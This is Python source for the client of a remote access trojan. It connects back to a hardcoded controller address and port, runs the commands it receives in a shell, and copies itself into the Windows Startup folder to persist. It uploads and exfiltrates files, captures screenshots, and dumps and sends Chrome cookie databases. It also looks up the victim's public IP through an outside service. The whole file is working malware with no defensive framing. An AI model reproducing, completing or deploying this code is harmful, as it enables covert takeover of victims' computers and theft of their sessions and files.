import socket
from os import getcwd, path, listdir, chdir, system, getenv
from time import sleep
from subprocess import getoutput
from platform import uname
import pyautogui
from requests import get
import sqlite3


SERVER_HOST = "192.168.1.6"
SERVER_PORT = 7700
BUFFER_SIZE = 1024 * 10000 # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"


 
        

def sysinfo():
        sysinfo = f"\nSystem: {uname().system}\n"
        sysinfo += f"Node Name: {uname().node}\n"
        sysinfo += f"Release: {uname().release}\n"
        sysinfo += f"Machine: {uname().machine}\n"
        sysinfo += f"Ip : {get('http://ip.42.pl/raw').text}\n"
        sysinfo += f"Version: {uname().version}\n"
        return sysinfo

def main():
    cwd = getcwd()
    client_socket.send(cwd.encode())    
    while True:
        command = client_socket.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if splited_command[0].lower() == "cd":
            try:
                chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        if 'addtostartup' in splited_command:
            system(f'copy {str(path.basename(__file__))} "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
            client_socket.send('Successfully added to Strat App'.encode())
            continue   
    
        if 'downloadfile' in splited_command:
            filename = splited_command[1]
            if path.exists(filename):
                filesize = path.getsize(filename)
                client_socket.send(f'{filesize}'.encode())
                file_to_read = open(filename,'rb')
                data_byt = file_to_read.read(BUFFER_SIZE)
                while True:
                    client_socket.send(data_byt)
                    data_byt = file_to_read.read(BUFFER_SIZE)
                    if not data_byt:
                        print('done')
                        client_socket.send('NOTBYT'.encode())
                        break
                continue
                file.close()    
            else:
                output = "File Not Found !"       

        if 'uploadfile' in splited_command:
            filename = splited_command[1]
            file = open(filename,'wb')
            data_byt = client_socket.recv(BUFFER_SIZE)
            while True:
                file.write(data_byt)
                data_byt = client_socket.recv(BUFFER_SIZE)
                if b'NOTBYT' in data_byt:
                    print('done')
                    break
            continue
            file.close()
            
        if command.lower() == 'screenshot':
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save('screen.png')
            file_to_read = open('screen.png','rb')
            data_byt = file_to_read.read(BUFFER_SIZE)
            while True:
                client_socket.send(data_byt)
                data_byt = file_to_read.read(BUFFER_SIZE)
                if not data_byt:
                    client_socket.send('NOTBYT'.encode())
                    break
            continue
            file.close()
        if command.lower() == 'dumpcookie':
            if system("uname > /dev/null") == 0 : # Linux
                db_path = getenv("HOME") + "/.config/google-chrome/Default/Cookies"
            else : # Windows
                appdata = getenv("appdata").replace("\\Roaming","")
                db_path = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"        
                db = sqlite3.connect(db_path)
                c = db.cursor()
                f = open('cookies.txt','a+')
                for raw in c.execute("SELECT * FROM cookies"):
                    for i in range(0,17):
                        f.writelines(str(raw[i])+'\n')
                    f.writelines('-'*30+'\n')    
                f.close()
            file_to_read = open('cookies.txt','rb')
            data_byt = file_to_read.read(BUFFER_SIZE)
            while True:
                client_socket.send(data_byt)
                data_byt = file_to_read.read(BUFFER_SIZE)
                if not data_byt:
                    client_socket.send(b'NOTBYT')
                    break
            continue
            file.close()        

        if command.lower() == 'info':
            print('on')
            output = sysinfo()

    
        else:
            print('a')
            output = getoutput(command)

        cwd = getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        client_socket.send(message.encode())        

    client_socket.close()


connected = False

while connected == False:
    try:
        client_socket = socket.socket()
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        connected = True
        main()
    except:
        sleep(2)   